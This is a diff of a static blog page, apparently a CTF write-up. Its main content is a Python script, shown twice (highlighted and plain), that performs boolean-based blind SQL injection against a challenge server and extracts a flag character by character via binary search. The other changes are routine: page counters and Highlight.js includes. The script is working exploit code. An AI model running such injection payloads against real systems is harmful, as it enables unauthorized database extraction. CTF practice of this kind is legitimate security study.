-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://49c9b1c145ed46acb5073a40c428c5fe070ca683e1374ccc.changame.ichunqiu.com/'</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    l = <span class="number">0</span></span><br><span class="line">    r = <span class="number">126</span></span><br><span class="line">    <span class="keyword">while</span> l &lt;= r:</span><br><span class="line">        m = (l+r)//<span class="number">2</span></span><br><span class="line">        p1 = str(binascii.hexlify((flag+chr(m)).encode()))[<span class="number">2</span>:<span class="number">-1</span>]</span><br><span class="line">        payload =<span class="string">'(((select 1,0x%s)&lt;=(select * from `f1ag_1s_h3r3_hhhhh`)))'</span>%(p1)</span><br><span class="line">        <span class="comment"># print(payload)</span></span><br><span class="line">        paramsPost = &#123;<span class="string">"id"</span>:payload&#125;</span><br><span class="line">        res = requests.post(url, data=paramsPost)</span><br><span class="line">        <span class="comment"># print(res.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Nu1L'</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            l = m + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            r = m - <span class="number">1</span></span><br><span class="line">    m = (l+r+<span class="number">1</span>)//<span class="number">2</span></span><br><span class="line">    flag += chr(m<span class="number">-1</span>)</span><br><span class="line">    print(<span class="string">"[+] flag: %s"</span> % flag)</span><br><span class="line"></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>
+<pre><code class="python">import requests
+import binascii
+import urllib.parse
+import string
 
+url = &#39;http://49c9b1c145ed46acb5073a40c428c5fe070ca683e1374ccc.changame.ichunqiu.com/&#39;
+
+flag = &#39;&#39;
+
+while True:
+    l = 0
+    r = 126
+    while l &lt;= r:
+        m = (l+r)//2
+        p1 = str(binascii.hexlify((flag+chr(m)).encode()))[2:-1]
+        payload =&#39;(((select 1,0x%s)&lt;=(select * from `f1ag_1s_h3r3_hhhhh`)))&#39;%(p1)
+        # print(payload)
+        paramsPost = {&quot;id&quot;:payload}
+        res = requests.post(url, data=paramsPost)
+        # print(res.text)
+        if &#39;Nu1L&#39; in res.text:
+            l = m + 1
+        else:
+            r = m - 1
+    m = (l+r+1)//2
+    flag += chr(m-1)
+    print(&quot;[+] flag: %s&quot; % flag)
+
+print(flag)
+</code></pre>
 
       
     </div>
@@ -574,7 +762,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">29</span>
+                  <span class="site-state-item-count">30</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -587,7 +775,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">10</span>
+                  <span class="site-state-item-count">11</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
@@ -678,6 +866,17 @@
   <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
 -->
 
+
+
+
+
+<!-- Highlight.js -->
+<link rel="stylesheet" href="//cdn.bootcss.com/highlight.js/9.2.0/styles/github.min.css">
+<script src="//cdn.bootcss.com/highlight.js/9.2.0/highlight.min.js">
+</script>
+<script>
+    hljs.initHighlightingOnLoad();
+</script>
 
 
         
